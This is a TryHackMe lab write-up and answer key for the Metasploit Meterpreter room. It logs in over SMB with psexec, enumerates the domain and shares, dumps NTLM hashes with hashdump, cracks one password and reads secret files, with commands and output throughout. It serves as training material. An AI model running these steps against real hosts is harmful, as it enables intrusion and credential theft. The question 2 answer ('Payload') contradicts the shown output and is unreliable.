---
title: "Metasploit: Meterpreter"
date: 2025-11-03
draft: false
tags:
  - Metasploit
  - TryHackMe
  - Cybersecurity
---
**Note:** 

- The questions are shortened for a cleaner view
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.

## Task  1 - 4

No answer needed

---
## Task  5 - Post-Exploitation Challenge

*We'll go through this exploitation process step-by-step.*

```bash
msfconsole
```

```bash
setg RHOSTS 10.48.176.232
```

```bash
use exploit/windows/smb/psexec
set SMBUSER ballen
set SMBPASS Password1
```

```bash
exploit
```

*We should have the meterpreter console*

#### 1) What is the computer name?

```bash
sysinfo
```

```bash
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
```

**Ans:** `ACME-TEST`

#### 2) What is the target domain?

*We can use a module in metasploit for this - yes I had to research around for this.*

`ctrl + z` - to background the session 

```bash
use post/windows/gather/enum_domain
```

```bash
set session 1
```

```bash 
run 
```

```bash
msf6 post(windows/gather/enum_domain) > run
[+] Domain FQDN: FLASH.local
[+] Domain NetBIOS Name: FLASH
[+] Domain Controller: ACME-TEST.FLASH.local (IP: 10.48.176.232)
[*] Post module execution completed
```

**Ans:** `Payload`

#### 3) What is the name of the share likely created by the user?

*We can use another module to achieve this*

```bash
search enum_share
use 0
```

```bash
set session 1
```

```
run
```

```bash
msf6 post(windows/gather/enum_shares) > run
[*] Running module against ACME-TEST (10.48.176.232)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed
```

**Ans:** `speedster`

#### 4) What is the NTLM hash of the jchambers user?

*Use `hasdump` in meterpreter console*

```
sessions 1
```

```
hashdump
```

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:bba82cd67d548226b0f5d069f090377a:::
```

**Ans:** `69596c7aa1e8daee17f8e78870e25a5c`

#### 5) What is the cleartext password of the jchambers user?

*You can use an online hash cracker to achieve this. I ended up using `crackstation.com`*

**Ans:** `Trustno1`

#### 6) Where is the "secrets.txt"  file located?

*We can try searching for the file.*

```bash
search -f secrets.txt
```

```bash
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100
```

**Ans:** `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`

#### 7) What is the Twitter password revealed in the "secrets.txt" file?

*We can `cat` the file.*

```bash
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

```bash
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
My Twitter password is KDSvbsw3849!
```

**Ans:** `KDSvbsw3849!`

#### 8) Where is the "realsecret.txt"  file located?

*We can try searching for the file.*

```bash
search -f realsecret.txt
```

```bash
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100
```

**Ans:** `c:\inetpub\wwwroot\realsecret.txt`

#### 9) What is the real secret?

*We can `cat` the file.*

```bash
cat "c:\inetpub\wwwroot\realsecret.txt"
```

```bash
meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
The Flash is the fastest man alive
```

**Ans:** `The Flash is the fastest man alive`

---
